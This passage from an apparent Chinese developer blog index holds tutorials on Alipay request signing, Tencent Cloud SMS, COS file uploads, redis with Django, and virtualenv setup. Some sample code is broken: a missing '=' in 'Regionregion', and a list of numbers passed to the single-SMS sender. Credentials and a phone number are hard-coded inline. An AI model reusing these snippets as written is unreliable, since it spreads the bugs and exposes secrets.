data[key] = json.dumps(data[key], separators=(<span class="string">','</span>, <span class="string">':'</span>))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sorted([(k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> data.items()])</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">sign</span><span class="params">(self, unsigned_string)</span>:</span></span><br><span class="line">        <span class="comment"># 开始计算签名</span></span><br><span class="line">        key = self.app_private_key</span><br><span class="line">        signer = PKCS1_v1_5.new(key)</span><br><span class="line">        signature = signer.sign(SHA256.new(unsigned_string))</span><br><span class="line">        <span class="comment"># base64 编码，转换为unicode表示并移除回车</span></span><br><span class="line">        sign = encodebytes(signature).decode(<span class="string">"utf-8"</span>).replace(<span class="string">"\n"</span>, <span class="string">""</span>)</span><br><span class="line">        <span class="keyword">return</span> sign</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">_verify</span><span class="params">(self, raw_content, signature)</span>:</span></span><br><span class="line">        <span class="comment"># 开始计算签名</span></span><br><span class="line">        key = self.alipay_public_key</span><br><span class="line">        signer = PKCS1_v1_5.new(key)</span><br><span class="line">        digest = SHA256.new()</span><br><span class="line">        digest.update(raw_content.encode(<span class="string">"utf-8"</span>))</span><br><span class="line">        <span class="keyword">if</span> signer.verify(digest, decodebytes(signature.encode(<span class="string">"utf-8"</span>))):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">verify</span><span class="params">(self, data, signature)</span>:</span></span><br><span class="line">        <span class="keyword">if</span> <span class="string">"sign_type"</span> <span class="keyword">in</span> data:</span><br><span class="line">            sign_type = data.pop(<span class="string">"sign_type"</span>)</span><br><span class="line">        <span class="comment"># 排序后的字符串</span></span><br><span class="line">        unsigned_items = self.ordered_data(data)</span><br><span class="line">        message = <span class="string">"&amp;"</span>.join(<span class="string">u"&#123;&#125;=&#123;&#125;"</span>.format(k, v) <span class="keyword">for</span> k, v <span class="keyword">in</span> unsigned_items)</span><br><span class="line">        <span class="keyword">return</span> self._verify(message, signature)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SaaS平台 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>腾讯云短信 &amp; 腾讯COS上传文件</title>
      <link href="/2020/08/02/%E8%85%BE%E8%AE%AF%E4%BA%91%E7%9F%AD%E4%BF%A1%20&amp;%20%E8%85%BE%E8%AE%AFCOS%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/"/>
      <url>/2020/08/02/%E8%85%BE%E8%AE%AF%E4%BA%91%E7%9F%AD%E4%BF%A1%20&amp;%20%E8%85%BE%E8%AE%AFCOS%E4%B8%8A%E4%BC%A0%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<h1 id="腾讯云短信-amp-腾讯COS上传文件"><a href="#腾讯云短信-amp-腾讯COS上传文件" class="headerlink" title="腾讯云短信 &amp; 腾讯COS上传文件"></a>腾讯云短信 &amp; 腾讯COS上传文件</h1><h2 id="1-腾讯云短信"><a href="#1-腾讯云短信" class="headerlink" title="1.腾讯云短信"></a>1.腾讯云短信</h2><p>腾讯云短信注册参考：<a href="https://pythonav.com/wiki/detail/10/81/" target="_blank" rel="noopener">https://pythonav.com/wiki/detail/10/81/</a></p><p>发送短信代码</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="comment"># ssl._create_default_https_context = ssl._create_unverified_context</span></span><br><span class="line"><span class="keyword">from</span> qcloudsms_py <span class="keyword">import</span> SmsMultiSender, SmsSingleSender</span><br><span class="line"><span class="keyword">from</span> qcloudsms_py.httpclient <span class="keyword">import</span> HTTPError</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_sms_single</span><span class="params">(phone_num, template_id, template_param_list)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    单条发送短信</span></span><br><span class="line"><span class="string">    :param phone_num: 手机号</span></span><br><span class="line"><span class="string">    :param template_id: 腾讯云短信模板ID</span></span><br><span class="line"><span class="string">    :param template_param_list: 短信模板所需参数列表，例如:【验证码：&#123;1&#125;，描述：&#123;2&#125;】，则传递参数 [888,666]按顺序去格式化模板</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    appid = <span class="number">112142311</span>  <span class="comment"># 自己应用ID</span></span><br><span class="line">    appkey = <span class="string">"8cc5b87123y423423412387930004"</span>  <span class="comment"># 自己应用Key</span></span><br><span class="line">    sms_sign = <span class="string">"Python之路"</span>  <span class="comment"># 自己腾讯云创建签名时填写的签名内容（使用公众号的话这个值一般是公众号全称或简称）</span></span><br><span class="line">    sender = SmsSingleSender(appid, appkey)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = sender.send_with_param(<span class="number">86</span>, phone_num, template_id, template_param_list, sign=sms_sign)</span><br><span class="line">    <span class="keyword">except</span> HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        response = &#123;<span class="string">'result'</span>: <span class="number">1000</span>, <span class="string">'errmsg'</span>: <span class="string">"网络异常发送失败"</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">send_sms_multi</span><span class="params">(phone_num_list, template_id, param_list)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    批量发送短信</span></span><br><span class="line"><span class="string">    :param phone_num_list:手机号列表</span></span><br><span class="line"><span class="string">    :param template_id:腾讯云短信模板ID</span></span><br><span class="line"><span class="string">    :param param_list:短信模板所需参数列表，例如:【验证码：&#123;1&#125;，描述：&#123;2&#125;】，则传递参数 [888,666]按顺序去格式化模板</span></span><br><span class="line"><span class="string">    :return:</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    appid = <span class="number">112142311</span></span><br><span class="line">    appkey = <span class="string">"8cc5b87123y423423412387930004"</span></span><br><span class="line">    sms_sign = <span class="string">"Python之路"</span></span><br><span class="line">    sender = SmsMultiSender(appid, appkey)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = sender.send_with_param(<span class="number">86</span>, phone_num_list, template_id, param_list, sign=sms_sign)</span><br><span class="line">    <span class="keyword">except</span> HTTPError <span class="keyword">as</span> e:</span><br><span class="line">        response = &#123;<span class="string">'result'</span>: <span class="number">1000</span>, <span class="string">'errmsg'</span>: <span class="string">"网络异常发送失败"</span>&#125;</span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    result1 = send_sms_single(<span class="string">"15131255089"</span>, <span class="number">548760</span>, [<span class="number">666</span>, ])</span><br><span class="line">    print(result1)</span><br><span class="line">    result2 = send_sms_single( [<span class="string">"15131255089"</span>, <span class="string">"15131255089"</span>, <span class="string">"15131255089"</span>, ],<span class="number">548760</span>, [<span class="number">999</span>, ])</span><br><span class="line">    print(result2)</span><br></pre></td></tr></table></figure><h2 id="2-腾讯COS上传文件"><a href="#2-腾讯COS上传文件" class="headerlink" title="2.腾讯COS上传文件"></a>2.腾讯COS上传文件</h2><h3 id="2-1-开通cos服务"><a href="#2-1-开通cos服务" class="headerlink" title="2.1 开通cos服务"></a>2.1 开通cos服务</h3><p><a href="https://console.cloud.tencent.com/cos5" target="_blank" rel="noopener">https://console.cloud.tencent.com/cos5</a></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/cos%E5%90%8E%E5%8F%B0.png"  alt="cos后台"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/cos%E5%88%9B%E5%BB%BA%E6%A1%B6.jpg"  alt="cos创建桶"></p><h3 id="2-2-python实现上传文件"><a href="#2-2-python实现上传文件" class="headerlink" title="2.2 python实现上传文件"></a>2.2 python实现上传文件</h3><p>安装所需的模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -U cos-python-sdk-v5</span><br></pre></td></tr></table></figure><p>使用</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8</span></span><br><span class="line"><span class="comment"># appid 已在配置中移除,请在参数 Bucket 中带上 appid。Bucket 由 BucketName-APPID 组成</span></span><br><span class="line"><span class="comment"># 1. 设置用户配置, 包括 secretId，secretKey 以及 Region</span></span><br><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosConfig</span><br><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosS3Client</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line">secret_id = <span class="string">'COS_SECRETID'</span>      <span class="comment"># 替换为用户的 secretId</span></span><br><span class="line">secret_key = <span class="string">'COS_SECRETKEY'</span>    <span class="comment"># 替换为用户的 secretKey</span></span><br><span class="line">region = <span class="string">'COS_REGION'</span>    <span class="comment"># 替换为用户的 Region,区域</span></span><br><span class="line"></span><br><span class="line">token = <span class="literal">None</span>                <span class="comment"># 使用临时密钥需要传入 Token，默认为空，可不填</span></span><br><span class="line">scheme = <span class="string">'https'</span>            <span class="comment"># 指定使用 http/https 协议来访问 COS，默认为 https，可不填</span></span><br><span class="line">config = CosConfig(Region=region, SecretId=secret_id, SecretKey=secret_key, Token=token, Scheme=scheme)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 获取客户端对象</span></span><br><span class="line">client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 创建桶</span></span><br><span class="line">response = client.create_bucket(</span><br><span class="line">Bucket=<span class="string">'hpsaas-1302636832'</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4.上传文件</span></span><br><span class="line">response = client.upload_file(</span><br><span class="line">Bucket=<span class="string">'hpsaas-1302636832'</span>,<span class="comment"># 要上传桶的名称</span></span><br><span class="line">    LocalFilePath=<span class="string">'local.txt'</span>,<span class="comment"># 本地文件路径</span></span><br><span class="line">    Key=<span class="string">'picture.jpg'</span>,<span class="comment"># 上传到桶之后的文件名</span></span><br><span class="line">    PartSize=<span class="number">1</span>,</span><br><span class="line">    MAXThread=<span class="number">10</span>,</span><br><span class="line">   EnableMD5=<span class="literal">False</span></span><br><span class="line">)</span><br><span class="line">print(response[<span class="string">'ETag'</span>])</span><br></pre></td></tr></table></figure><p>例子1：上传文件</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosConfig</span><br><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosS3Client</span><br><span class="line"></span><br><span class="line">secret_id = <span class="string">'自己id'</span>  <span class="comment"># 替换为用户的srcretid</span></span><br><span class="line">secret_key = <span class="string">'自己的key'</span><span class="comment"># 替换为用户的 secretkey</span></span><br><span class="line"></span><br><span class="line">region = <span class="string">'ap-chengdu'</span>  <span class="comment"># 替换为用户的Region</span></span><br><span class="line"></span><br><span class="line">config = CosConfig(Regionregion, SecretId=secret_id, SecretKey=secret_key)</span><br><span class="line"></span><br><span class="line">client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line">response = client.upload_file(</span><br><span class="line">Bucket=<span class="string">'hpsaas-1302636832'</span>,</span><br><span class="line">    LocalFilePath=<span class="string">'code.png'</span>,<span class="comment"># 本地文件路径</span></span><br><span class="line">    Key=<span class="string">'p1.png'</span>,<span class="comment"># 上传到桶之后的文件名</span></span><br><span class="line"></span><br><span class="line">)</span><br><span class="line">print(response[<span class="string">'ETag'</span>])</span><br></pre></td></tr></table></figure><p>例子2：创建桶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosConfig</span><br><span class="line"><span class="keyword">from</span> qcloud_cos <span class="keyword">import</span> CosS3Client</span><br><span class="line"></span><br><span class="line">secret_id = <span class="string">'自己id'</span>  <span class="comment"># 替换为用户的srcretid</span></span><br><span class="line">secret_key = <span class="string">'自己的key'</span><span class="comment"># 替换为用户的 secretkey</span></span><br><span class="line"></span><br><span class="line">region = <span class="string">'ap-chengdu'</span>  <span class="comment"># 替换为用户的Region</span></span><br><span class="line"></span><br><span class="line">config = CosConfig(Regionregion, SecretId=secret_id, SecretKey=secret_key)</span><br><span class="line"></span><br><span class="line">client = CosS3Client(config)</span><br><span class="line"></span><br><span class="line">response = client.create_bucket(</span><br><span class="line">Bucket=<span class="string">'examplebucket-12500000000'</span>,</span><br><span class="line">    ACL=<span class="string">"public-read"</span></span><br><span class="line">        <span class="comment"># private私有</span></span><br><span class="line">        <span class="comment"># public-read公共读私有写</span></span><br><span class="line">        <span class="comment"># public-read-write公共读公共写</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SaaS平台 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>redis基本操作</title>
      <link href="/2020/08/02/redis%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/"/>
      <url>/2020/08/02/redis%E5%9F%BA%E6%9C%AC%E6%93%8D%E4%BD%9C/</url>
      
        <content type="html"><![CDATA[<h1 id="redis基本操作"><a href="#redis基本操作" class="headerlink" title="redis基本操作"></a>redis基本操作</h1><h3 id="1-安装redis"><a href="#1-安装redis" class="headerlink" title="1. 安装redis"></a>1. 安装redis</h3><p>参考：<a href="https://pythonav.com/wiki/detail/10/82/" target="_blank" rel="noopener">https://pythonav.com/wiki/detail/10/82/</a></p><h3 id="2-python操作redis模块"><a href="#2-python操作redis模块" class="headerlink" title="2. python操作redis模块"></a>2. python操作redis模块</h3><p>安装redis模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install redis</span><br></pre></td></tr></table></figure><p>相关操作</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 直接连接redis</span></span><br><span class="line">conn = redis.Redis(host=<span class="string">'192.168.3.109'</span>, port=<span class="number">6379</span>, password=<span class="string">'foobared'</span>, encoding=<span class="string">'utf-8'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置键值：111111="9999" 且超时时间为10秒（值写入到redis时会自动转字符串）</span></span><br><span class="line">conn.set(<span class="string">'111111'</span>, <span class="number">9999</span>, ex=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据键获取值：如果存在获取值（获取到的是字节类型）；不存在则返回None</span></span><br><span class="line">value = conn.get(<span class="string">'111111'</span>)</span><br><span class="line">print(value)</span><br></pre></td></tr></table></figure><p>上面python操作redis的示例是以直接创建连接的方式实现，每次操作redis如果都重新连接一次效率会比较低，建议使用redis连接池来替换，例如：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> redis</span><br><span class="line"></span><br><span class="line"><span class="comment"># 创建redis连接池（默认连接池最大连接数 2**31=2147483648）</span></span><br><span class="line">pool = redis.ConnectionPool(host=<span class="string">'192.168.3.109'</span>, port=<span class="number">6379</span>, password=<span class="string">'foobared'</span>, encoding=<span class="string">'utf-8'</span>, max_connections=<span class="number">1000</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 去连接池中获取一个连接</span></span><br><span class="line">conn = redis.Redis(connection_pool=pool)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 设置键值：111111="9999" 且超时时间为10秒（值写入到redis时会自动转字符串）</span></span><br><span class="line">conn.set(<span class="string">'111111'</span>, <span class="number">9999</span>, ex=<span class="number">10</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 根据键获取值：如果存在获取值（获取到的是字节类型）；不存在则返回None</span></span><br><span class="line">value = conn.get(<span class="string">'name'</span>)</span><br><span class="line">print(value)</span><br></pre></td></tr></table></figure><h3 id="3-django-redis模块操作"><a href="#3-django-redis模块操作" class="headerlink" title="3.django-redis模块操作"></a>3.django-redis模块操作</h3><ol><li>安装django-redis模块</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install django-redis</span><br></pre></td></tr></table></figure><ol start="2"><li>在django项目的settings.py中添加相关配置</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">CACHES = &#123;</span><br><span class="line">    <span class="string">"default"</span>: &#123;</span><br><span class="line">        <span class="string">"BACKEND"</span>: <span class="string">"django_redis.cache.RedisCache"</span>,</span><br><span class="line">        <span class="string">"LOCATION"</span>: <span class="string">"redis://192.168.3.109"</span>, <span class="comment"># 安装redis的主机的 IP 和 端口</span></span><br><span class="line">        <span class="string">"OPTIONS"</span>: &#123;</span><br><span class="line">            <span class="string">"CLIENT_CLASS"</span>: <span class="string">"django_redis.client.DefaultClient"</span>,</span><br><span class="line">            <span class="string">"CONNECTION_POOL_KWARGS"</span>: &#123;</span><br><span class="line">                <span class="string">"max_connections"</span>: <span class="number">1000</span>,</span><br><span class="line">                <span class="string">"encoding"</span>: <span class="string">'utf-8'</span></span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="string">"PASSWORD"</span>: <span class="string">"foobared"</span> <span class="comment"># redis密码</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ol start="3"><li>在django的视图中操作redis</li></ol><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> django.shortcuts <span class="keyword">import</span> HttpResponse</span><br><span class="line"><span class="keyword">from</span> django_redis <span class="keyword">import</span> get_redis_connection</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span><span class="params">(request)</span>:</span></span><br><span class="line">    <span class="comment"># 去连接池中获取一个连接</span></span><br><span class="line">    conn = get_redis_connection(<span class="string">"default"</span>)</span><br><span class="line">    conn.set(<span class="string">'nickname'</span>, <span class="string">"hp"</span>, ex=<span class="number">10</span>)</span><br><span class="line">    value = conn.get(<span class="string">'nickname'</span>)</span><br><span class="line">    print(value)</span><br><span class="line">    <span class="keyword">return</span> HttpResponse(<span class="string">"OK"</span>)</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> SaaS平台 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>前期准备</title>
      <link href="/2020/08/02/%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87/"/>
      <url>/2020/08/02/%E5%89%8D%E6%9C%9F%E5%87%86%E5%A4%87/</url>
      
        <content type="html"><![CDATA[<h1 id="前期准备"><a href="#前期准备" class="headerlink" title="前期准备"></a>前期准备</h1><h2 id="1-虚拟环境-virtualenv（项目环境隔离）"><a href="#1-虚拟环境-virtualenv（项目环境隔离）" class="headerlink" title="1.虚拟环境 virtualenv（项目环境隔离）"></a>1.虚拟环境 virtualenv（项目环境隔离）</h2><h3 id="1-1-安装"><a href="#1-1-安装" class="headerlink" title="1.1 安装"></a>1.1 安装</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install virtualenv</span><br></pre></td></tr></table></figure><h3 id="1-2-创建虚拟环境"><a href="#1-2-创建虚拟环境" class="headerlink" title="1.2 创建虚拟环境"></a>1.2 创建虚拟环境</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">virtualenv 环境名称</span><br><span class="line"></span><br><span class="line"><span class="comment"># 注意：创建[环境名称]文件夹，放置所有的环境,进入指定的目录</span></span><br><span class="line">virtualenv 环境名称 --python=python3<span class="number">.6</span></span><br><span class="line">virtualenv 环境名称 --python=<span class="string">'C:\python\python3.6'</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span> 打开终端</span><br><span class="line"><span class="number">2.</span> 安装virtualenv</span><br><span class="line"><span class="number">3.</span> 关闭终端，重新打开</span><br><span class="line"><span class="number">4.</span> 通过命令进入指定目录</span><br></pre></td></tr></table></figure><h3 id="1-3-激活-退出-虚拟环境"><a href="#1-3-激活-退出-虚拟环境" class="headerlink" title="1.3 激活/退出 虚拟环境"></a>1.3 激活/退出 虚拟环境</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">win:</span><br><span class="line">    &gt;&gt;&gt;cd Scripts 进入虚拟环境Scripts目录</span><br><span class="line">    &gt;&gt;&gt;activate.exe激活虚拟环境</span><br><span class="line">mac：</span><br><span class="line">&gt;&gt;&gt; source s28/bin/activate</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">win:</span><br><span class="line">    &gt;&gt;&gt;cd Scripts</span><br><span class="line">    &gt;&gt;&gt;deactivate.exe退出虚拟环境</span><br><span class="line">mac：</span><br><span class="line">&gt;&gt;&gt; source s28/bin/deactivate</span><br></pre></td></tr></table></figure><h3 id="1-4-在虚拟环境中安装模块"><a href="#1-4-在虚拟环境中安装模块" class="headerlink" title="1.4 在虚拟环境中安装模块"></a>1.4 在虚拟环境中安装模块</h3><ul><li><p>激活虚拟环境</p></li><li><p>在激活环境中安装模块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install django&#x3D;&#x3D;1.11.29</span><br><span class="line">pip install django&#x3D;&#x3D;1.11.29 -i https:&#x2F;&#x2F;pypi.douban.com&#x2F;simple --trusted-host pypi.douban.com</span><br></pre></td></tr></table></figure></li></ul><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E8%99%9A%E6%8B%9F%E7%8E%AF%E5%A2%83%E5%AE%89%E8%A3%85%E6%A8%A1%E5%9D%97.jpg"  alt="虚拟环境安装模块"></p><h2 id="2-搭建项目环境（Django-虚拟环境）"><a href="#2-搭建项目环境（Django-虚拟环境）" class="headerlink" title="2.搭建项目环境（Django+虚拟环境）"></a>2.搭建项目环境（Django+虚拟环境）</h2><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE1.jpg"  alt="创建项目1"></p><p><img src="/" class="lazyload" data-src="http://hp256.gitee.io/blog/Django%E5%9B%BE%E7%89%87/%E5%88%9B%E5%BB%BA%E9%A1%B9%E7%9B%AE2.jpg"  alt="创建项目2"></p><h2 id="3-本地配置"><a href="#3-本地配置" class="headerlink" title="3.本地配置"></a>3.本地配置</h2><h3 id="3-1-在settings-py文件中导入"><a href="#3-1-在settings-py文件中导入" class="headerlink" title="3.1 在settings.py文件中导入"></a>3.1 在settings.py文件中导入</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> .local_settings <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">pass</span></span><br></pre></td></tr></table></figure><h3 id="3-2创建自己的本地配置"><a href="#3-2创建自己的本地配置" class="headerlink" title="3.2创建自己的本地配置"></a>3.2创建自己的本地配置</h3><p>在自己的项目中创建local_settings.py文件，在该文件中修改setting的配置。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">LANGUAGE_CODE = <span class="string">'zh-hans'</span></span><br><span class="line"></span><br><span class="line">SMS = <span class="number">666</span></span><br></pre></td></tr></table></figure><h2 id="4-分享代码"><a href="#4-分享代码" class="headerlink" title="4.分享代码"></a>4.分享代码</h2><h3 id="4-1-创建一个远程的仓库（gitee-github）"><a href="#4-1-创建一个远程的仓库（gitee-github）" class="headerlink" title="4.1 创建一个远程的仓库（gitee/github）"></a>4.1 创建一个远程的仓库（gitee/github）</h3><h3 id="4-2-本地代码推送到git"><a href="#4-2-本地代码推送到git" class="headerlink" title="4.2 本地代码推送到git"></a>4.2 本地代码推送到git</h3><ul><li><p>让git忽略一些文件.gitgnore</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># pycharm</span><br><span class="line">.idea&#x2F;</span><br><span class="line">.DS_Store</span><br><span class="line"></span><br><span class="line">__pycache__&#x2F;</span><br><span 